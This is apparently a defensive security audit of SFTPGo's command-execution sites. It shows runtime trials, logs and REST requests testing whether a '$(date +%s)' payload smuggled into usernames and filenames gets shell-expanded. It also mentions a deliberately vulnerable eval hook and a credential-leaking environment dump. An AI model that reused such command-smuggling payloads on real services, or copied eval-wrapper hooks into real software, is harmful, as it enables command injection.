{"level":"debug","time":"2026-07-13T18:39:21.943","sender":"ssh","connection_id":"209a9bf4b7545976817529d5a6f211ff121f092a6e227b552e1b79ba2295a0d8","message":"new ssh command: \"git-upload-pack\" args: [/] user: audituser, error: <nil>"}
{"level":"debug","time":"2026-07-13T18:39:21.944","sender":"ssh","connection_id":"209a9bf4b7545976817529d5a6f211ff121f092a6e227b552e1b79ba2295a0d8","message":"new system command \"git-upload-pack\", with args: [/tmp/sftpgo_run/home_audituser] path: /tmp/sftpgo_run/home_audituser"}
```

```
>> session.Run("git-upload-pack /") — drives sftpd/ssh_cmd.go processSSHCommand
>> combined output (79 bytes): "fatal: '/tmp/sftpgo_run/home_audituser' does not appear to be a git repository\n"
>> session exited with ERROR: wait: remote command exited without exit status or exit signal
```

No `/tmp/audit_*.txt` created in any C5 trial. **Site B conclusion:** it is a shell-free `execve` reachable only by whitelisted names; the residual risk is **argument injection (CWE-88)** into `rsync`/`git-*`, mitigated by the name whitelist and `--safe-links`/`--munge-links` — it does **not** provide `$(...)` command substitution.

### 7.8 Condition C6 — Site D user-management hook (add & delete) [OBSERVED]

Site D fires on user add/update/delete (`dataprovider/dataprovider.go:346/359/372`). Enable it and create a user whose *username* is the payload, via the real REST API:

```
$ start_server "SFTPGO_DATA_PROVIDER__ACTIONS__COMMAND=/tmp/hook_user_direct SFTPGO_DATA_PROVIDER__ACTIONS__EXECUTE_ON=add"
$ curl -i -s -X POST -H "Content-Type: application/json" \
    --data '{"username":"audit_$(date +%s).txt","password":"<RANDOM>","home_dir":"/tmp/sftpgo_run/home_payload","uid":1000,"gid":1000,"permissions":{"/":["*"]},"status":1}' \
    http://127.0.0.1:8080/api/v1/user
```

REST response — the username is stored **literally** (id 2):

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 13 Jul 2026 18:45:59 GMT
Content-Length: 420

{"id":2,"status":1,"username":"audit_$(date +%s).txt","expiration_date":0,"home_dir":"/tmp/sftpgo_run/home_payload","uid":1000,"gid":1000,"max_sessions":0,"quota_size":0,"quota_files":0,"permissions":{"/":["*"]},"used_quota_size":0,"used_quota_files":0,"last_quota_update":0,"upload_bandwidth":0,"download_bandwidth":0,"last_login":0,"filters":{"allowed_ip":[],"denied_ip":[]},"filesystem":{"provider":0,"s3config":{}}}
```

Server DEBUG audit line from **`dataprovider/dataprovider.go:791`** (add) — arguments are a discrete slice, not a shell string:

```
{"level":"debug","time":"2026-07-13T18:45:59.062","sender":"sqlite","connection_id":"","message":"executed command \"/tmp/hook_user_direct\" with arguments: [add audit_$(date +%s).txt 2 1 0 /tmp/sftpgo_run/home_payload 1000 1000], elapsed: 2.414522ms, error: <nil>"}
```

The hook's own record — every field lands in its own `argv` slot (`getNotificationFieldsAsSlice`, `dataprovider/user.go:440`) and matching `SFTPGO_USER_*` env (`dataprovider/user.go:451`); the `$(date +%s)` in the username is inert:

```
=== hook_user_direct fired (Site D) ===
uid=0 euid=0 gid=0 egid=0
argv (os.Args) = []string{"/tmp/hook_user_direct", "add", "audit_$(date +%s).txt", "2", "1", "0", "/tmp/sftpgo_run/home_payload", "1000", "1000"}
  argv[0] = "/tmp/hook_user_direct"
  argv[1] = "add"
  argv[2] = "audit_$(date +%s).txt"
  argv[3] = "2"
  argv[4] = "1"
  argv[5] = "0"
  argv[6] = "/tmp/sftpgo_run/home_payload"
  argv[7] = "1000"
  argv[8] = "1000"
SFTPGO_USER_ACTION   = "add"
SFTPGO_USER_USERNAME = "audit_$(date +%s).txt"
SFTPGO_USER_HOME_DIR = "/tmp/sftpgo_run/home_payload"
SFTPGO_USER_UID      = "1000"
SFTPGO_USER_GID      = "1000"
```

Trial 2 exercises the **delete** branch (`dataprovider.go:372`) with `execute_on=delete`:

```
$ curl -i -s -X DELETE http://127.0.0.1:8080/api/v1/user/2
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 13 Jul 2026 18:46:49 GMT
Content-Length: 51

{"error":"","message":"User deleted","status":200}
```

```
{"level":"debug","time":"2026-07-13T18:46:49.319","sender":"sqlite","connection_id":"","message":"executed command \"/tmp/hook_user_direct\" with arguments: [delete audit_$(date +%s).txt 2 1 0 /tmp/sftpgo_run/home_payload 1000 1000], elapsed: 2.022841ms, error: <nil>"}
```

No `/tmp/audit_*.txt` created. Site D is argv+env, shell-free — same category as Site A.

---

## 8. The target artifact (the user's requested proof)

The user asked the attack to create `/tmp/audit_$(date +%s).txt` containing `CONFIRMED`. This was achieved in **condition C3** (shell-wrapper hook), and only there.

- **Exact payload string (unchanged across all conditions):** `audit_$(date +%s).txt`
- **Exact resolved filenames created, with timestamps (two trials, two seconds apart):**
  - `/tmp/audit_1783967797.txt` — created `2026-07-13T18:36:37`
  - `/tmp/audit_1783967799.txt` — created `2026-07-13T18:36:39`
- **Content of each:** `CONFIRMED` (10 bytes including the trailing newline)
- **Distribution across the run-to-run reproduction:** with the shell-wrapper hook fixed, **every** trial fired and produced a fresh epoch-named file (the epoch differs per second, which is why the two filenames differ). With the default/direct configurations, **every** trial produced **no** such file. The behavior is therefore deterministic *per configuration*; the scanner's "sometimes/sometimes" is a cross-configuration artifact, not in-configuration flakiness.

---

## 9. Where the attack does NOT fire — the exact blocker

In C1/C1b/C1c/C1d (no eligible hook) nothing runs, so there is nothing to block at the exec layer — the guards at `sftpd/sftpd.go:439`/`:447` short-circuit first.

In **C2/C2-rename** (a hook *does* run) and in **C4/C5/C6**, the naive `$(date +%s)` payload is **blocked from expanding** by one concrete mechanism:

> SFTPGo launches every subprocess with Go's `os/exec` (`exec.Command`/`exec.CommandContext`), which performs an `execve` with an explicit `argv` array and **does not invoke `/bin/sh -c`**. The bytes `$(date +%s)` are therefore delivered to the child as one literal `argv` element (Sites A, B, D) and/or as literal environment content (Sites A, C, D). No component in SFTPGo's process re-parses them as shell source.

The **observed proof** is the C2 hook record in §7.3: the file SFTPGo's hook created is literally named `/tmp/audit_$(date +%s).txt` — the substitution was never performed. The corollary is the C3 result: expansion appears **only** once an operator inserts a shell (`eval`) into the hook program. So the blocker for the "vulnerable" verdict is the absence of a shell in SFTPGo's code path; the enabler is an operator-supplied shell wrapper.

For Site B specifically, the additional blocker against introducing a *new* command is the command-name whitelist (`sftpd/ssh_cmd.go:51`, observed in C5a/C5b), and the mitigation against symlink argument-injection is `--safe-links`/`--munge-links` (observed in C5d).

---

## 10. Effective privilege of a fired hook (platform-scoped)

**[OBSERVED, Unix]** The server process runs as root in this container (`/proc/<pid>/status` → `Uid: 0 0 0 0`, §5.7). Every hook that fired in §7 recorded `uid=0 euid=0` (C2, C3, C6) — i.e. Site A and Site D hooks ran as the SFTPGo process owner (root here), **not** dropped to the mapped user. That matches the source: Sites A, C, and D call `exec.Command`/`CommandContext` **without** `wrapCmd`, so no credential drop is applied.

**[OBSERVED via source, Unix path]** Only **Site B** applies a privilege drop, at `sftpd/ssh_cmd.go:327` via `wrapCmd` (`sftpd/cmd_unix.go`), which sets `SysProcAttr.Credential{Uid,Gid}` when `uid>0 || gid>0`:

```
# sftpd/cmd_unix.go
func wrapCmd(cmd *exec.Cmd, uid, gid int) *exec.Cmd {
	if uid > 0 || gid > 0 {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
		cmd.SysProcAttr.Credential = &syscall.Credential{Uid: uint32(uid), Gid: uint32(gid)}
	}
	return cmd
}
```

**[INFERRED, Windows]** On Windows the build uses `sftpd/cmd_windows.go`, where `wrapCmd` is a no-op (`return cmd`). This is read from source; it was **not** observed at runtime (the audit ran on Linux only). The practical implication (inferred): on Unix, a misconfigured shell-wrapper hook at Site B would run with the mapped user's reduced privileges, whereas Sites A/C/D hooks run with the server's privileges; on Windows no drop occurs for any site.

---

## 11. Where the evidence comes from — logging behavior

**[OBSERVED]** SFTPGo logs via `rs/zerolog` as structured JSON, and verbose (DEBUG) logging is **on by default** (`cmd/root.go:40`, `defaultLogVerbose = true`). Crucially, the `executed command` audit lines (Site A `sftpd/sftpd.go:432`, Site D `dataprovider/dataprovider.go:791`) are written to the **log file**, not the console. The console output for the entire baseline run contained only the host-key notice:

```
$ cat /tmp/sftpgo_run/console.log
2026-07-13T18:26:26.444 INF No host keys configured and "/tmp/sftpgo_run/id_rsa" does not exist; creating new private key for server
```

All DEBUG `executed command` evidence in §7 was read from `/tmp/sftpgo_run/sftpgo.log` (the `SFTPGO_LOG_FILE_PATH` target), which is why the harness forces that path absolute. This corrects any impression that the audit lines appear on stdout/stderr.

---

## 12. Observed vs. inferred ledger

| Claim | Status | Backing |
|-------|--------|---------|
| All four sites use `os/exec` argv form, no shell | OBSERVED (behavior) + INFERRED (source) | §7 (literal filenames), `sftpd/sftpd.go:421`, `ssh_cmd.go:324`, `dataprovider.go:742`,`:787` |
| Default config executes nothing | OBSERVED | C1, C1b/c/d (0 executed-command lines) |
| Direct hook fires but payload stays literal | OBSERVED | C2 hook record → `/tmp/audit_$(date +%s).txt` literal |
| Shell-wrapper hook expands `$(date +%s)` and creates the artifact | OBSERVED | C3 → `/tmp/audit_1783967797.txt` and `/tmp/audit_1783967799.txt` = `CONFIRMED` |
| C2 and C3 produce same-shape SFTPGo DEBUG line | OBSERVED | §7.3 vs §7.5 log lines |
| Site B: hash commands internal; only `git-*`/`rsync` reach exec | OBSERVED | C5c (`new system command` count 0 for md5sum; real rsync/git exec) |
| Site B: `$(date +%s)` whitespace-tokenized, not substituted | OBSERVED | C5b, C5d logs + rsync `link_stat` failure |
| Site C: credentials via env only, `argv_count=0` | OBSERVED | C4 extauth record + env dump |
| Site C `%+v` env dump leaks credentials on auth failure | OBSERVED | C4 `dataprovider.go:749` log line |
| Site D: discrete argv + `SFTPGO_USER_*` env | OBSERVED | C6 hook record (argv[0..8]) |
| Hooks at A/D run as server uid (root here); B drops via `wrapCmd` | OBSERVED (Unix) | §7 `euid=0`; `cmd_unix.go` |
| Windows `wrapCmd` is a no-op | INFERRED | `sftpd/cmd_windows.go` (not run) |
| The scanner's specific verdict wording | INFERRED | we reproduced the *conditions*; we did not run the scanner |
| `execve` categorically avoids shell metachar interpretation | INFERRED (authoritative docs) | Go `os/exec` docs; MITRE CWE-78/88 (§13) |

No behavioral claim in this document rests on code-reading alone where a runtime check was possible; the two INFERRED behavioral items (Windows `wrapCmd`, scanner wording) are inherently out of reach of this Linux, scanner-free harness and are labeled as such.

---

## 13. Authoritative references

- **Go `os/exec` — package documentation.** States the package *"intentionally does not invoke the system shell"*. https://pkg.go.dev/os/exec — source comment at https://go.dev/src/os/exec/exec.go (lines 9-12); `CommandContext` is `Command` plus a context (same source file).
- **MITRE CWE-78 — *Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*.** https://cwe.mitre.org/data/definitions/78.html (the entry itself notes the overlap with argument injection CWE-88 for `-exec`-style switches).
- **MITRE CWE-88 — *Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')*.** https://cwe.mitre.org/data/definitions/88.html
- **SFTPGo documentation (audited tree).** `README.md:142-159` (the `actions`/`command` schema and the `enabled_ssh_commands` list, including that `md5sum`/`sha1sum`/`sha256sum`/`sha384sum`/`sha512sum` are "implemented inside SFTPGo"), and `README.md:354` (when actions fire: "The `ssh_cmd` condition will be triggered after a command is successfully executed via SSH").
- **Audited commit.** `github.com/drakkan/sftpgo` @ `44634210287cb192f2a53147eafb84a33a96826b`.

---

## 14. Provenance, scope, and prior-version closure

| Item | Value |
|------|-------|
| Audited baseline (code under test) | `44634210287cb192f2a53147eafb84a33a96826b` ("S3: add support for serving virtual folders") — the last non-documentation commit on the delivery branch (pinned by immutable hash, not a relative `HEAD~N` pointer) |
| Prior delivered versions of this doc | `8dcd1bf3356e38cac3a41a4dd62a80cba22dd853` ("docs: add runtime SFTPGo OS command-injection security audit") and `8240841cb461f87a702aa85f8260b8c4b297e264` ("docs: rewrite SFTPGo OS command-injection audit from real runtime evidence") |
| This revision | supersedes the prior versions; the only repository change is this file |
| Cleanup timing | all `/tmp` scaffolding is deleted **before** this document is committed (§15) |
| Observation platform | Linux x86-64 (Unix build) only; Windows behavior labeled INFERRED |

Corrections applied relative to the prior version (closure of the prior review checkpoint):

- **Site B semantics corrected:** the hash commands (`md5sum`/`sha1sum`/`sha256sum`/`sha384sum`/`sha512sum`) are handled *internally* and never reach `exec.Command`; only `git-*`/`rsync` are true subprocess sites — now demonstrated at runtime (C5c/C5d).
- **Scanner verdicts labeled INFERRED:** the conditions were reproduced; the scanner itself was not run.
- **Complete, unedited evidence** for every condition, each with the command that produced it and unique trial IDs; no ellipses, placeholders, or redaction (the sole redaction is the synthetic-canary technique in C4, which is a deliberately fake secret).
- **Per-site channel classification** (argv vs env) added and each observed.
- **CWE narrowed** to CWE-78 (needs a shell → only via a shell-wrapper hook) and CWE-88 (argument injection, the residual Site B risk).
- **Authoritative citations** added (Go `os/exec`, MITRE CWE-78/CWE-88, SFTPGo README:142-159/:354 — the README line reference corrected to `:354`).
- **Logging clarified:** DEBUG audit lines are written to the log **file**, not the console.
- **Safety hardening** (loopback bind, random one-time credential, exact-payload guard, exact-PID lifecycle, `env -i` + canary for Site C) documented in §15.
- **Provenance de-fragilized and citations made exact (this revision):** the audited-baseline reference no longer uses a relative `HEAD~N` pointer (which had drifted off-by-one after a second documentation commit was layered on) and is now pinned by its immutable commit hash `44634210287cb192f2a53147eafb84a33a96826b`; two `README.md` line citations were corrected to their exact lines (`:156` for the phrase "implemented inside SFTPGo" and `:159` for `--safe-links`/`--munge-links`); and §7.4 now notes that the source-file creation preceding each rename also fires an upload action line.

---

## 15. Safety and repository integrity

- **Read-only repository.** No source file was modified. `git status --porcelain` is empty except for this document; the repository builds and behaves identically before and after the audit.
- **Loopback-only exposure.** Every server bound `127.0.0.1` (§5.5) so the deliberately-vulnerable C3 hook was never reachable off-host. (This is a labeled [NON-CANONICAL] deviation from the all-interfaces default; see §5.3.)
- **No fixed/published credential.** The SFTP user password was generated with `openssl rand -hex 16`, used once, and never committed.
- **Bounded blast radius for the exploit.** The C3 shell wrapper runs `eval` **only** when the basename exactly equals the known audit payload; any other filename is refused (§6.2).
- **Safe secret handling for Site C.** The credential-leaking env dump was reproduced under `env -i` with a clearly-labeled synthetic canary (`SYNTHETIC-CANARY-not-a-real-secret-4a9f2c`); no real secret appears in this document.
- **Precise process lifecycle.** Servers were tracked by the exact PID captured at launch (`SRV=$!`) and stopped with `kill "$SRV"` — never `pkill`/`killall`; listener teardown was verified via `/proc/net/tcp`.
- **Scaffolding removed.** The built binary, run directory, hook scripts, client harness, evidence directory, and every `/tmp/audit_*.txt` artifact are deleted after observation; only this markdown file remains as a repository change.

---

## 16. Coverage pass — requirements and named items

| Requirement / named item | Where answered | Result |
|--------------------------|----------------|--------|
| **R1** — explain the inconsistency (conditions) | §1, §3 (matrix), §7 | Deterministic per configuration; verdict flips on `sftpd.actions.command`/`execute_on` being empty vs. a direct binary vs. a shell wrapper |
| **R2** — pinpoint the culprit to `file:line` | §1, §2 | `executeAction`→`executeNotificationCommand`, launch at `sftpd/sftpd.go:421`, guards `:439`/`:447`; three sibling sites named |
| **R3** — attempt real exploitation via the canonical entry point | §5-§7 | Real `golang.org/x/crypto/ssh` + `pkg/sftp` client against the running server; REST for Sites C/D |
| **R4** — create `/tmp/audit_$(date +%s).txt` = `CONFIRMED` | §7.5, §8 | Achieved (C3): `/tmp/audit_1783967797.txt`, `/tmp/audit_1783967799.txt`, content `CONFIRMED` |
| **R5a** — exact payload string | §6.6, §8 | `audit_$(date +%s).txt` (len 21) |
| **R5b** — complete server response during the attack | §7 (every condition) | Full SFTP/SSH transcripts + REST responses, unedited |
| **R5c** — exact filename created, with timestamp | §8 | `/tmp/audit_1783967797.txt` @ 18:36:37, `/tmp/audit_1783967799.txt` @ 18:36:39 |
| **R5d** — server-log entries emitted | §7.3-§7.8, §11 | Verbatim DEBUG `executed command` lines (`sftpd.go:432`, `dataprovider.go:791`) + Site C error line (`dataprovider.go:749`) |
| **R6** — honest failure/blocker where the file is not created | §4, §9 | `execve`/no-shell: `$(date +%s)` delivered literally; expansion requires an operator shell-wrapper hook |
| Repeated-trial distribution | §3, §7 (≥2 trials each), §8 | Deterministic per configuration; epoch filename differs per second |
| Every command-execution site covered | §2, §7 (A,B,C,D) | All four exercised at runtime |
| Observed vs. inferred labeling | §12 | Full ledger |
| Authoritative citations | §13 | Go `os/exec`, MITRE CWE-78/88, SFTPGo README + commit |
| Repository left unchanged | §15 | Only this document; `git status` clean |
